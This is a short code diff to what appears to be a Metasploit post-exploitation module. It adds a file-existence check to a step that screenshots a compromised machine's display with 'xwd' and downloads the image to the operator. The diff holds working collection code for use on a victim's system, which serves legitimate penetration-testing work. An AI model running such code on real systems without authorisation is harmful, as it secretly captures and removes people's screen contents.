@@ -561,10 +561,15 @@ def run
      # mitre ATT&CK T1113 - Screen capture (remote desktop)
      #
      if datastore['SCREEN_CAPTURE'] == true
-       print_line("")
        print_status("Taking a screenshot of: #{sys_info['Computer']}")
        cmd_exec("xwd -root -out /tmp/ScreenShot.xwd")
        Rex::sleep(1)
+         # make sure that file was build
+         path="/tmp/ScreenShot.xwd"
+         if not session.fs.file.exist?(path)
+           print_error("module can not create Screenshot.xwd in /tmp remote folder")
+           return nil
+         end
        # download remote file
        client.fs.file.download("/root/ScreenShot.xwd","/tmp/ScreenShot.xwd")
        print_status("ScreenShot stored in: /root/ScreenShot.xwd")
